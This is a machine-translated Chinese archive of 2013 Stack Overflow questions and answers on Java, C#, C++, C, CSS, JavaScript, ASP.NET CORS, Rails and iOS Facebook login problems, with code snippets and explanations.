代码看起来像这样。我有两节课。用户和用户。Users 类，将用户列表作为 Linked List 进行管理，是添加、删除等操作的类。我必须编写一种方法，而不是从一个用户向另一个用户发送消息。

该方法位于 User 类中，另一个 send 方法位于 Users 类中，User 将调用该方法 - send() 以访问列表。由于用户的主要构造函数被设置为驱动整个程序。我必须编写另一个构造函数。但我被困在这里。

```
import java.util.*;

public class User 
{
    private String name;
    private Users users;

    public User()
    {
        this.name = readName();
    }
    public User(Users users)
    {
        this.users = users;
    }
    private String readName()
    {
        System.out.print("  Name: ");
        return In.nextLine();
    }
    public boolean matches(String name)
    {
        return this.name.equals(name);
    }
    public String getName()
    {
        return this.name;
    }

    public void use()
    {
        char c = readChoice();
        while (!isEnd(c))
        {
            execute(c);
            c = readChoice();
        }
    }
    private char readChoice()
    {
        System.out.print("  Choice (l/r/s/d/x): ");
        return In.nextChar();
    }
    private boolean isEnd(char c)
    {
        return c == 'x';
    }
    private void execute(char c)
    {
        switch(c)
        {
        case 'l': look(); break;
        case 'r': read(); break;
        case 's': send(); break;
        default : System.out.println("    Invalid choice");
        }
    }
    private void look()
    {

    }
    private void read()
    {

    }
    private void send()
    {
        users.send();
    }

} 
```

二等

```
import java.util.*;

public class Users 
{
    public static void main(String[] args)
    {
        new Users();
    }

    private LinkedList<User> users = new LinkedList<User>();
    private LinkedList<Email> emails = new LinkedList<Email>();

    public Users()
    {       
        menu();
    }

    private void menu()
    {
        char c = readChoice();
        while (!isEnd(c))
        {
            execute(c);
            c = readChoice();
        }
    }
    private char readChoice()
    {
        System.out.print("Choice (a/d/g/u/x): ");
        return In.nextChar();
    }
    private boolean isEnd(char c)
    {
        return c == 'x';
    }
    private void execute(char c)
    {
        switch(c)
        {
        case 'a': add(); break;
        case 'd': delete(); break;
        case 'g': break;
        case 'u': use(); break;
        default : System.out.println("    Invalid choice");
        }
    }

    private void add()
    {
        User user = new User();
        if (!exists(user.getName()))
        {   
            users.add(user);
            System.out.println("    User " + getIndex(user) + ": " +     

                        user.getName());
        }
        else
            System.out.println("already exists");
    }

    private int getIndex(User user)
    {
        int index = users.indexOf(user) + 1;
        return index;
    }

    private void delete()
    {
        User user = user(readName());
        if (user != null)
            users.remove(user);
        else
            System.out.println("  No such name");
    }

    public void send()
    {

    }

    private void use()
    {
        User user = new User();
        if (exists(user.getName()))
            user.use();
        else
            System.out.println("    No such user");
    }

    private boolean exists(String name)
    {
        return user(name) != null;
    }

    private User user(String name)
    {
        for (User user: users)
            if (user.matches(name))
                return user;
        return null;
    }

    private String readName()
    {
        System.out.print("  Names: ");
        return In.nextLine();
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T01:12:49.733

在第一个文件（类）中，您需要初始化变量。`private Users users = new Users();`

这样，您的`send`方法将不会访问空对象。

但是，查看您的代码，您会遇到更大的问题：用户访问用户，反之亦然。

你的问题不是空指针，你的问题是你的程序设计不正确。如果 ClassA 使用 ClassB，ClassB 应该尽可能**不**使用 ClassA。在您的情况下，您需要重新考虑您的逻辑。

要使用建议的解决方案，当您在第二个文件中实例化 User 时，您应该将当前对象作为引用传递。像这样

```
 private void add()
  {
    User user = new User(this);
    ...
  } 
```

还有这个

```
 private void use()
{
    User user = new User(this);
    ...
} 
```

# c# - 如何从图形中删除图像

> ID：15845853
> 
> 赞同：0
> 
> 时间：2013-04-06T00:58:05.867
> 
> 标签：c#, image, graphics

假设我多次使用 DrawImage 来绘制一堆图像。

`e.Graphics.DrawImage(newImage, destRect);`

如何从我绘制的图形纸中删除特定图像？是否有可以用于删除的特定功能？

我试过`dispose`and `Rectangle.Empty`，但他们实际上并没有删除我已经在纸上画的图像。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:16:05.770

krikara，你应该做的是：

1.  跟踪列表中的所有积木
2.  当球击中砖块时，从列表中删除该砖块

每一帧，你都必须从头开始重绘一切。这包括球、桨和积木列表（以及您需要的任何其他内容，例如得分等）

希望这可以消除您的任何困惑。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T06:30:57.260

首先，GDI+ Graphics 中没有“删除对象”的概念。您必须在每一帧中重新绘制整个客户区。您应该在内存中保留对象及其状态的列表，并在每一帧中重绘整个表面。但请注意，这可能会导致闪烁和不那么流畅的用户体验。以下是避免这些情况的一些提示：

1.  确保您的 Form 或 UserControl 的`DoubleBuffered`属性设置为 True。这将产生比其他方式更平滑的动画。

2.  永远不要调用`CreateGraphics()`在绘图循环中获取对 Graphics 对象的引用。更新循环中的对象和状态列表，然后调用`Invalidate()`控件/表单并在`Paint`事件中执行绘图过程。

3.  的一个重载`Invalidate()`允许您指定需要无效（重绘）的矩形。您可以在弹跳球的当前位置（例如比球大小宽/高 20 像素）周围传递一个“安全”矩形作为 agrument，然后在您的`Paint`事件中仅绘制该部分。

4.  为了进一步提高性能，您可以将分数、玩家姓名等辅助信息保留在实际“游戏板”之外，并为它们使用普通标签/文本框而不是绘图。

# java - Java Swing GridBagLayout

> ID：15845855
> 
> 赞同：1
> 
> 时间：2013-04-06T00:58:33.103
> 
> 标签：java, swing

我一直在使用 GridBagLayout 学习 Java Swing。

我有一个主 JFrame 并添加主 JPanel，然后将后续 JPanel/组件添加到该主 JPanel。

但是我添加的任何东西**总是位于**主面板的中心（包括调整大小时），这不是理想的结果。

只是核心代码的一小段：

```
getContentPane().setLayout(new GridBagLayout());
JPanel panel = new JPanel(new GridBagLayout());
getContentPane().add(panel);

GridBagConstraints gbc = new GridBagConstraints();
gbc.gridx = 0;
gbc.gridy = 0;
gbc.anchor = GridBagConstraints.NORTHWEST;

JTextField nameField = new JTextField(10);
panel.add(nameField, gbc) 
```

任何反馈将不胜感激，谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T01:03:18.177

将来，当您遇到问题时，请发布 SSCCE。一小段代码通常没有帮助。

阅读 Swing 教程中有关[如何使用 GridbagLayout](http://docs.oracle.com/javase/tutorial/uiswing/layout/gridbag.html)的部分。“weightx/weighty”部分将解释为什么会发生这种情况。

# javascript - 通过元素属性将数据库变量传递给jQuery？

> ID：15845857
> 
> 赞同：0
> 
> 时间：2013-04-06T00:58:50.603
> 
> 标签：javascript, jquery

是否有“通过元素属性将数据库变量传递给 jQuery”的规范？

我已经这样做了很长时间：

```
<script>
   var status = <%= status %>;
</script> 
```

我宁愿做这样的事情：

```
<variable data-name="status" data-value="<%= status %>" /> 
```

然后用jquery得到它：

```
var status = $('variable[data-name="status"]').attr("data-value"); 
```

我需要从显示中隐藏元素。我知道有一个模式，我只是不知道它叫什么或如何搜索它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T01:02:43.480

你有没有尝试过：

`<input type="hidden" data-name="status" data-value="<%= status %>" />`

# oop - 使用大量的多态性是不是很糟糕？

> ID：15845858
> 
> 赞同：5
> 
> 时间：2013-04-06T00:59:03.760
> 
> 标签：oop, polymorphism

我听说使用大量的多态是不好的，最好的代码设计是尽可能避免多态。这是真的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T01:06:16.063

你可能听说过继承。设计原则是支持对象组合而不是类继承。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-06T01:02:10.507

不，很多设计模式主要是使用多态来实现的。工厂模式是使用它的更常见的模式之一。

它是面向对象编程的基础部分。

# css - 我可以使用 CSS :hover 来影响其他元素的属性吗？

> ID：15845861
> 
> 赞同：2
> 
> 时间：2013-04-06T00:59:26.800
> 
> 标签：css, css-selectors

将鼠标悬停在相应的图像上时，我试图更改文本链接属性（不同的颜色和文本装饰：下划线；）。

这是html：

```
<!-- Wraps image, title, category -->
                <div class="itemWrap">
                    <!-- Item Image -->
                    <a href="#" class="itemImageLink"><img class="itemImage" src="img/thumb.png" alt="thumb"></a>
                    <!-- Item Title -->
                    <div class="itemTitle">
                        <a href="#">The original soul of Michael Jackson</a>
                    </div>
                    <!-- Item Category -->
                    <div class="itemCat">
                        <a href="#">12" Picture Disc</a>
                    </div>
                </div><!-- close itemWrap --> 
```

是否有可能将鼠标悬停在 itemImage（包含在锚中）上时，可以更改 .itemTitle 中链接的属性？

可能值得注意的是 itemWrap 在网页上被多次使用。

谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-06T01:02:59.990

您可以`:hover`在复合选择器中的任何位置使用，因此如果您可以在包含 时选择要更改的元素`:hover`，那么可以。

在这种情况下，你不能真正做到这一点，`itemImage`因为它涉及回溯 DOM，但你可以做到这一点`itemImageLink`，例如：

```
.itemImageLink:hover ~ .itemTitle {
    ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T01:39:51.627

我设法解决了我的具体问题，但感谢其他人的尝试。

我必须使用**兄弟**选择器和**后代**选择器的组合。

我将 psuedo 应用于`:hover`图像周围的锚点，并通过名称选择下一个兄弟，`.itemTitle`然后选择 .itemTitle 的后代`.itemTitleLink`。

```
.itemImageLink:hover ~ .itemTitle > .itemTitleLink {color:#CD3333;text-decoration:underline;}

<a href="#" class="itemImageLink">
<div class="itemTitle"><!-- sibling of .itemImageLink -->
    <a href="#" class="itemTitleLink">Link</a><!-- descendant of .itemTitle -->
</div> 
```

# iphone - iOS：indexPath.row、UICollectionView 和图像

> ID：15845864
> 
> 赞同：1
> 
> 时间：2013-04-06T01:00:12.200
> 
> 标签：iphone, ios, uiviewcontroller

我试图`UICollectionView`在我的主 iphone 屏幕上显示只有 9 张图片。但是我的显示有问题。我的第一张图片总是重复 2 次（在第 1 行的位置 1 和位置 2）。

我的代码有问题吗？

```
// Define the number of Cell.
- (NSInteger)collectionView:(UICollectionView *)collectionView numberOfItemsInSection:(NSInteger)section{

return  9; }

// The cell that is returned must be retrieved from a call to -dequeueReusableCellWithReuseIdentifier:forIndexPath:
- (UICollectionViewCell *)collectionView:(UICollectionView *)collectionView cellForItemAtIndexPath:(NSIndexPath *)indexPath{

    static NSString *IdCell = @"Cell";

     SSCollectionViewCell *cell = (SSCollectionViewCell *) [collectionView dequeueReusableCellWithReuseIdentifier: IdCell forIndexPath: indexPath];
    int imageNumber = indexPath.row % 9;

    cell.imageView.image = [UIImage imageNamed: [NSString stringWithFormat:@"M2_img_%d@2x.png", imageNumber]];

    return cell;

    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-03T14:07:13.300

您不需要指定 UICollectionView 中有多少个部分吗？您已经有了委托方法 numberOfItemsInSection，对吧？现在，在 numberOfSectionsInCollectionView 委托方法中，您指定了 1 吗？如：

*   (NSInteger)numberOfSectionsInCollectionView: (UICollectionView *)collectionView { return 1; //如果它只有 9 张图片 }

# c++ - 在类函数中将参数传递给 _beginthread

> ID：15845865
> 
> 赞同：1
> 
> 时间：2013-04-06T01:00:19.577
> 
> 标签：c++, windows, multithreading, beginthread

我一直在我的（Windows）C++ 类中使用 _beginthread 来创建线程。据我所知，要使用 _beginthread 并在类中传递成员函数，必须遵循一个相当迟钝的包装协议，例如：

```
class MyClass
{
public:
    void fun_1()
    {  
        _beginthread(&MyClass::fun_2_wrapper, 0, static_cast<void*>(this));
    }

private:
    void fun_2()
    {
        printf("hello");  
    }  

    static void __cdecl fun_2_wrapper(void* o)
    {
        static_cast<MyClass*>(o)->fun_2();
    }
}; 
```

我一直无法将此模型转换为接受线程函数参数的模型。例如，如果我希望我的线程函数改为：

```
void fun_2(int a) 
```

我将如何正确调整我的函数调用？（注意，我试图在没有 boost::thread 或类似库的情况下完成此项目以保持项目一致性）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2018-08-28T14:21:12.620

您可以包装将传递给结构的参数，然后将结构传递给函数。

例子：

```
#include <Windows.h>
#include "stdio.h"
#include "stdlib.h"
#include <process.h>

class TestWrapperMultThreadToClass
{
public:
    TestWrapperMultThreadToClass(int ThreadNum)
    {
        _ThreadNum = ThreadNum; // how many thread we would create
        TestTimes = ThreadNum * 2;
    }

    ~TestWrapperMultThreadToClass()
    {

    }

    bool TestMultThreadSendParam()
    {
        tb = new ThreadBlockParam[_ThreadNum];
        for (int i = 0; i < _ThreadNum; i++) // initial
            (tb + i)->IsIdle = true;

        int ThreadIndex = 0, nowThread = 0;
        unsigned int ThreadId_For_Beginthreadex_Function = 0;
        for (int i = 0; i < TestTimes; i++)
        {
            ThreadId_For_Beginthreadex_Function = static_cast<unsigned int>(i);
            nowThread = i;

            // wrap arguments
            (tb + nowThread)->ThreadIndex = ThreadId_For_Beginthreadex_Function;
            (tb + nowThread)->InIterativeTimes = i;
            (tb + nowThread)->IsIdle = false;
            (tb + nowThread)->_wrap = (void*) this;
            _beginthreadex(NULL, 0, FunctionCalledByThread, (tb + nowThread), 0, &ThreadId_For_Beginthreadex_Function);
        }

        IsAllThreadComeBack(tb, _ThreadNum); // check whether all threads come back

        return true;
    }

private:
    int _ThreadNum, TestTimes;

    typedef struct _ThreadBlockParam
    {
        int ThreadIndex;
        int InIterativeTimes;
        bool IsIdle;
        void* _wrap;
    }ThreadBlockParam;
    ThreadBlockParam *tb;

    static unsigned int __stdcall FunctionCalledByThread(void *ptr_this)
    {
        ThreadBlockParam *_tb = static_cast<ThreadBlockParam*>(ptr_this);
        TestWrapperMultThreadToClass *_this = (TestWrapperMultThreadToClass*)(_tb->_wrap);

        _this->Test(_tb);
        return 1;
    }

    void Test(ThreadBlockParam* _tb)
    {
        ThreadBlockParam *temp = _tb;
        int ThreadId = GetCurrentThreadId();
        char Msg[200];

        Sleep(1000);
        sprintf(Msg, "In %d-th thread, thread id = %d!\n", temp->ThreadIndex, ThreadId);
        printf(Msg);
        Sleep(5000); // wait few second to check whether execute with different thread.

        temp->IsIdle = true;
    }

    bool IsAllThreadComeBack(ThreadBlockParam *tb, int ThreadNum)
    {
        int count = 0;

        while (count < ThreadNum)
        {
            if ((tb + count)->IsIdle == true)
                count++;
        }
        return true;
    }

};

int main()
{
    TestWrapperMultThreadToClass *Test = new TestWrapperMultThreadToClass(8);
    Test->TestMultThreadSendParam();

    printf("Multiple thread wrapper to class testing is finishing!\n");

    system("pause");
    return 0;
} 
```

# asp.net-mvc-4 - 附加到 HTTP 响应的 CORS 标头未发送到浏览器

> ID：15845869
> 
> 赞同：5
> 
> 时间：2013-04-06T01:00:49.010
> 
> 标签：asp.net-mvc-4, asp.net-web-api, iis-7.5, cors

我正在通过`HttpContext.Current`对象直接写入 ASP.NET MVC 中的请求标头，但这些标头并未发送到浏览器...知道可能导致这种情况的原因吗？如果我通过 web.config 添加它们，我只会得到标题。这对我不起作用，因为我需要允许多个域`Access-Control-Allow-Origin`.

我试图直接编写标题以`HttpContext.Current`使用此代码。

```
context.Response.AppendHeader("Access-Control-Allow-Origin", origin);
context.Response.Cache.SetCacheability(HttpCacheability.NoCache);
context.Response.ContentType = "text/plain";
context.Response.Write("Hello World " + DateTime.Now.ToString()); 
```

我得到了你好世界，但没有得到标题。

我也尝试过使用`Thinktecture.IdentityModel.Http.Cors.WebApi`但得到相同的结果，这没什么。我已经检查了重新检查我的代码，以确保它符合教程] [1](http://brockallen.com/2012/06/28/cors-support-in-webapi-mvc-and-iis-with-thinktecture-identitymodel/)。我已经在 Web.config 中配置了标头，并通过 Thinktecture 进行了尝试，但是我只`Access-Control-Allow-Origin`在 web.config 中获取标头，但在 Chrome/FF 中仍然出现错误。似乎标头仅在 OPTIONS 请求中发送，但我不确定。

```
Accept:*/*
Accept-Charset:ISO-8859-1,utf-8;q=0.7,*;q=0.3
Accept-Encoding:gzip,deflate,sdch
Accept-Language:en-US,en;q=0.8,ga;q=0.6,pt-BR;q=0.4,pt;q=0.2
Access-Control-Request-Headers:accept, origin, content-type
Access-Control-Request-Method:GET
Authorization:Negotiate REDACTED
Cache-Control:max-age=0
Connection:keep-alive
Host:bpapi.domain.com
Origin:http://dev-02
Referer:http://dev-02/_Layouts/PAR/NewParItem.aspx
User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.43 Safari/537.31

HTTP/1.1 200 OK
Server: Microsoft-IIS/7.5
Persistent-Auth: false
X-Powered-By: ASP.NET
Access-Control-Allow-Origin: http://dev-02
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
WWW-Authenticate: Negotiate REDACTED
Date: Sat, 06 Apr 2013 00:35:31 GMT
Content-Length: 0 
```

这是[web.config 作为 pastebin](http://pastebin.com/AjGLwtLj)，以免混淆问题。***未***安装WebDAV 。

```
public class CorsConfig
{
    public static void RegisterCors(HttpConfiguration httpConfig)
    {
        WebApiCorsConfiguration corsConfig = new WebApiCorsConfiguration();

        corsConfig.RegisterGlobal(httpConfig);

        corsConfig
                .ForResources(new string[] { "Industries", "Projects" })
                .ForOrigins(new string[] { "http://dev-01", "http://dev-02" })
                .AllowAll();
    }
} 
```

这是 Thinktecture 代码：

```
 protected void Application_Start()
    {
        AreaRegistration.RegisterAllAreas();

        WebApiConfig.Register(GlobalConfiguration.Configuration);
        FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters);
        RouteConfig.RegisterRoutes(RouteTable.Routes);
        BundleConfig.RegisterBundles(BundleTable.Bundles);
        //CorsConfig.RegisterCors(GlobalConfiguration.Configuration);
        RegisterCors(MvcCorsConfiguration.Configuration);
    }
    private void RegisterCors(MvcCorsConfiguration corsConfig)
    {
        corsConfig
            .ForResources(new string[] {"Industries", "Projects" })
            .ForOrigins(new string[] { "http://dev-01", "http://dev-02" })
            .AllowAll();
    } 
```

**2013/04/09 更新：**既没有`context.Response.AppendHeader(...)`也`context.Response.AddHeader(...)`没有任何效果。如果 Chrome 和 FF 获得 JSONP 而不管允许来源标头如何，它们似乎没问题，所以我的项目至少可以工作。我也试过`<remove name="OPTIONSVerbHandler"/>`没有成功。我会将 MVC 应用程序部署到新服务器，以查看它是否已本地化到特定机器。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T11:11:01.677

可能是，您的麻烦是由于 OPTIONSVerbHandler。有关详细信息，请参阅此链接：http:
[//eugeneagafonov.com/post/38312919044/iis-options-cors-aspnet-webapi-en](http://eugeneagafonov.com/post/38312919044/iis-options-cors-aspnet-webapi-en)

# c++ - this 指针、operator= 和 operator++

> ID：15845872
> 
> 赞同：0
> 
> 时间：2013-04-06T01:01:06.287
> 
> 标签：c++

基于 operator= 复制重载和学习对象的分配。为类编码运算符++。

说明是：

```
Seti operator++( );
  This operator simply increases the value of a Seti object's frequency
  by 1 (to a maximum of 9), before returning a copy of itself.
    NOTE: The frequency can never exceed 9. 
```

我可以这样做吗：

```
Seti Seti::operator++( ) {
    Seti temp;
    temp = *this
    if (temp.freq<9)
    temp.freq+=1;
    return temp;
} 
```

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T02:15:41.210

`operator++()`是**预增量**运算符。它旨在修改原始对象，然后在递增后返回对该对象的*引用。*引用允许代码直接从返回值继续访问原始对象，例如：

```
Seti s;
(++s).something // something applies to s itself, not a copy of s 
```

`operator++(int)`是**后增量**运算符。它旨在修改原始对象，然后在递增之前返回对象的*副本。*由于它正在返回对象的先前状态，因此它不会返回对原始对象的*引用。*

您的作业中显示的声明建议使用**预增量**运算符，因为没有输入参数。但是，返回值应该是一个引用。*正确*的实现是：

```
Seti& Seti::operator++()
{
    if (this->freq < 9)
        this->freq += 1;
    return *this;
} 
```

另一方面，如果你想实现**后自增**运算符，*正确*的实现应该是：

```
Seti Seti::operator++(int)
{
    Seti temp(*this);
    if (this->freq < 9)
        this->freq += 1;
    return temp;
} 
```

使用运算符时：

```
Seti s;
++s; // calls operator++()
s++; // calls operator++(int) 
```

C++ 标准的第 13.5.7 节显示了这些运算符的官方声明：

```
class X {
public:
    X& operator++(); // prefix ++a
    X operator++(int); // postfix a++
};

class Y { };
Y& operator++(Y&); // prefix ++b
Y operator++(Y&, int); // postfix b++ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T01:06:48.330

这与指定的行为不匹配，即增加对象`operator++`被调用的频率。

# ruby-on-rails - 在新用户注册时保留表单值（设计）

> ID：15845873
> 
> 赞同：0
> 
> 时间：2013-04-06T01:01:10.857
> 
> 标签：ruby-on-rails, ruby, devise

我有一个新的用户注册表单，如果验证失败，我想保留表单中的值。我没有看到这样做的方法。

现在在我的控制器中我有

```
def create
  .....code......
  @user = User.new params[:user]
  redirect_to new_user_registration_url(@user)
end 
```

但是，这是行不通的。验证后需要做什么来实现持久值？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T01:41:17.967

您不想在验证失败时重定向。您应该渲染`new`动作（或任何适合您情况的动作）。重定向将无法访问调用上下文中的任何实例变量；这本质上是一个全新的请求。典型的设置是这样的：

```
def SomeController < ApplicationController

  def new
    @foo = Foo.new
  end

  def create
    @foo = Foo.new(params[:foo])
    if @foo.save
      redirect_to foo_path(@foo)
    else
      render action: 'new'
    end
  end

end 
```

这里`render action:`可能有点混乱。它实际上并没有调用动作；相反，它呈现该操作的默认视图。在这种情况下，如果`Foo`保存失败，它将呈现`new`表单，但不会填充新的`Foo`，而是填充`Foo`保存失败的。因此，您将再次获得表单中的所有值。通常，当您呈现表单（或在您的布局中）时，您还将检查并呈现模型上可能存在的任何错误 ( `@foo`)。

# ruby-on-rails-3 - 在 Rails 中处理许多不同后台任务的最佳方法

> ID：15845881
> 
> 赞同：0
> 
> 时间：2013-04-06T01:02:07.957
> 
> 标签：ruby-on-rails-3, mongoid, delayed-job, background-process, resque

我们必须在后台运行很多不同的任务，包括：

*   视频转码
*   视频上传到 S3
*   在第三方 API 中创建对象
*   从第三方 API 获取统计信息（每天午夜）
*   [……]

我预测自己会做所有事情。然而，我的一位朋友指出，`Resque`这似乎很有趣，减去了`redis`跑步的过度劳累。我也开始关注`delayed_job`and `sidekick`，后者似乎没有积极发展。

此后台任务是您的核心业务。我想能够轻松调试并详细报告失败的任务对我们来说很重要。所以，我不介意花很多时间在上面。我想知道是否有人已经遇到过这类问题，首选的路径是什么？

我们当前的堆栈是专用 ubuntu 服务器上的 rails、mongoid、mongoDB。

# css - CSS - 保持悬停状态“取消悬停”？

> ID：15845891
> 
> 赞同：1
> 
> 时间：2013-04-06T01:03:21.517
> 
> 标签：css, html, hover, transition

我有一排 5 个 div，当你将鼠标悬停在一个上时，它会填满屏幕的宽度。![6 多彩多姿的 div](https://i.stack.imgur.com/aiKy1.jpg)

蓝色 div 默认填充屏幕宽度；这样屏幕总是满的，当我将鼠标悬停在其他 div 上时，我可以应用 css 来缩小它，因为它是在 HTML 中最后声明的：

```
#green{
    width:20px;
}
#blue{
    width:100%;
}
#green:hover{
    width:100%
}
#green:hover ~ #blue{
    width:20px;   
} 
```

有没有办法让一个 div 在“悬停”后保持打开状态？例如，如果橙色 div 已打开并且鼠标离开它但没有移到另一个彩色 div 上，它可以保持其全宽。目前，当鼠标滚下时，div 会滑回蓝色。

另外，我可以在没有任何脚本的情况下执行此操作吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T01:45:49.067

不，没有 javascript，你无法做到这一点。但这里有一些您可以使用的示例代码：

```
<div id="green" onmouseover="green()">foo</div>

<div id="blue" onmouseover="blue()">more foo</div>

<div id="pink" onmouseover="pink()">even more foo</div> 
```

和脚本：

```
function green() {
    $('div').css('width','20px');
    $('#green').css('width','100%');
}

function blue() {
    $('div').css('width','20px');
    $('#blue').css('width','100%');
}

function pink() {
    $('div').css('width','20px');
    $('#pink').css('width','100%');
} 
```

希望这可以帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-15T17:11:13.933

是的，您可以使用 CSS 动画在没有脚本的情况下完成。见[http://cdpn.io/GLjpK](http://cdpn.io/GLjpK)

它不像使用脚本那样可靠，但它是可能的——甚至在悬停后保留它，这是具有挑战性的部分。

# javascript - 检索没有名称或 ID 的元素

> ID：15845897
> 
> 赞同：1
> 
> 时间：2013-04-06T01:04:16.820
> 
> 标签：javascript

我正在尝试编写一些代码来完成一些非常简单的事情。我以前从未使用过 PayPal 按钮，这造成了一些困难。

我之前可以使用 document.getElementById 或 document.getElementsByName() 模拟按钮单击，但是，我在上面尝试提交的表单没有名称或 id，所以我不知道如何引用在我的代码中。

我正在尝试使用 Javascript 编写一个简短的 chrome 扩展程序，该扩展程序将在页面上找到 paypal 表单/按钮（我不拥有或无法控制），并在我无需单击它的情况下提交它。任何指导/链接将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T01:32:04.643

看起来你的按钮有一个名字，所以你可以使用[.getElementsByName()](https://developer.mozilla.org/en-US/docs/DOM/document.getElementsByName)

```
var btn = document.getElementsByname('submit')[0] 
```

如果您可以访问[jQuery](http://jquery.com/)，或者您可以将[jQuery](http://jquery.com/)添加到您的项目中，那么

```
var btn = jQuery('input[name="submit"]') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T01:17:39.137

使用 jQuery 会更容易，但是使用原生 js，你可以这样做：

```
function getPaypalForms()
{
  var matchingElements = [];
  var allForms = document.getElementsByTagName('form');
  for (var i = 0; i < allForms.length; i++)
  {
    if (allForms[i].getAttribute('action') == 'https://www.paypal.com/cgi-bin/webscr')
    {
      // Element exists with attribute. Add to array.
      matchingElements.push(allElements[i]);
    }
  }
  return matchingElements;
} 
```

有很多方法可以编辑上面的这个函数，以更好地满足您的目的。您可以对其进行编辑以仅从这些表单中收集提交按钮，或者对其进行重构以接受字符串以匹配属性和值。但是，就像我说的，使用 jquery 会容易得多：

```
$('form[action="https://www.paypal.com/cgi-bin/webscr"]'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T01:52:24.020

根据您的更新，首先：不要这样做，除非您试图骗取人们的钱。在这种情况下，不要这样做=）（我不是律师，但我很确定贝宝可以“好吧，你没有点击按钮，你自动化了它。现在某人的网站让你花了 500 美元你不想。强硬”）。也就是说：document.getElementsByTagName("form")，然后过滤 getAttribute("action")。

# c - if语句中argv的奇怪问题

> ID：15845899
> 
> 赞同：2
> 
> 时间：2013-04-06T01:04:42.257
> 
> 标签：c, if-statement, string-comparison, argv

我在我的一个 C 程序中的 if 语句中遇到了 argv 问题。我知道我一定遗漏了一些简单而愚蠢的东西（我已经有一段时间没有用 C 语言做过任何事情了）。问题是，如果我在命令行上没有指定其他内容，它不会 doOtherStuff() 。即使我执行 ./a.out -i 它仍然运行 doStuff()。有谁看到这里可能缺少什么？非常感谢您！

```
int main(int argc, char *argv[])

    if(argv[1] == "-a" || "-A")
    {
       doStuff();
    }
    else
    {
        doOtherStuff();
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T01:06:12.273

如果要比较 C 中的字符串，则必须使用 strcmp 之类的方法：[http ://www.cplusplus.com/reference/cstring/strcmp/](http://www.cplusplus.com/reference/cstring/strcmp/)

在 C 中，字符串实际上是一个字符数组，因此您正在比较 2 个数组的内存地址（这当然会有所不同，因为它们是不同的数组）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-06T01:06:44.813

您正在将 C 字符串与*相等运算符*( `==`) 进行比较。

您必须改用[strcmp](http://en.cppreference.com/w/c/string/byte/strcmp)函数（在 中定义`string.h`）。

像：

```
#include <string.h>

int main(int argc, char *argv[])
{
    if(strcmp(argv[1], "-a") == 0 || strcmp(argv[1], "-A") == 0)
    {
        doStuff();
    }
    else
    {
        doOtherStuff();
    }
} 
```

请注意，字符串比较是编程中最基本的操作之一，您的`if`陈述也不正确。如果您还没有这样做，请尝试阅读有关基础知识的更多信息。

# ios - Facebook SDK 3.2 登录仅在应用程序未终止时才有效

> ID：15845901
> 
> 赞同：2
> 
> 时间：2013-04-06T01:05:00.047
> 
> 标签：ios, facebook, login, sdk

我的 Facebook 登录只有在没有退出应用程序才能登录时才有效。例如，它仅在应用程序使用 iOS6 原生对话框或强制 Web 视图登录时才有效。当我尝试使用 safari 或 Facebook 应用程序登录时，它会显示一个页面，显示我已经授权了该应用程序。我单击“确定”，然后它带我回到我的应用程序，但登录没有完成。

有任何想法吗？我在这个问题上卡了很久...

提前致谢！

下面是我用来登录的代码。如果我强制使用 web 视图，登录将起作用，因为它不必切换出应用程序即可登录，但每次对用户执行此操作似乎不是很高效的。

```
 FBSession *session =
[[FBSession alloc] initWithAppID:@"12345"
                     permissions:nil
                 urlSchemeSuffix:@"paid"
              tokenCacheStrategy:nil];

if (allowLoginUI ||
    (session.state == FBSessionStateCreatedTokenLoaded)) {
    [FBSession setActiveSession:session];
    [session openWithBehavior:FBSessionLoginBehaviorWithFallbackToWebView
            completionHandler:
     ^(FBSession *session, FBSessionState state, NSError *error) {
         [self sessionStateChanged:session state:state error:error];
     }];
    result = session.isOpen;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T21:56:42.433

你有没有`- application:openURL:sourceApplication:annotation:`在你的应用代理中实现，声明应用程序支持 URL 方案`fb[YOUR APP ID]`并连接起来，以便应用程序代理调用最终到达`[[FBSession activeSession] handleOpenURL:url]`？

外部 Web 视图的工作方式是，如果登录成功，则它会尝试使用包含登录令牌的特定于应用程序的方案打开 URL。您应该已将您的应用设置为 URL 方案的处理程序，然后将相关 URL 传递到 Facebook SDK，以便它可以解码令牌。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T21:57:47.793

您可以尝试在您的 AppDelegate 实现文件中添加以下方法吗？（假设你还没有）：

```
//
// During the Login with FB flow, the app passes control to the Facebook iOS app or Facebook in mobile Safari.
// After the user is authenticated, the app will be called back with the session information.
// This method calls the Facebook session object that handles the incoming URL.
//
- (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(NSString *) sourceApplication annotation:(id)annotation
{
    return [FBSession.activeSession handleOpenURL:url];
} 
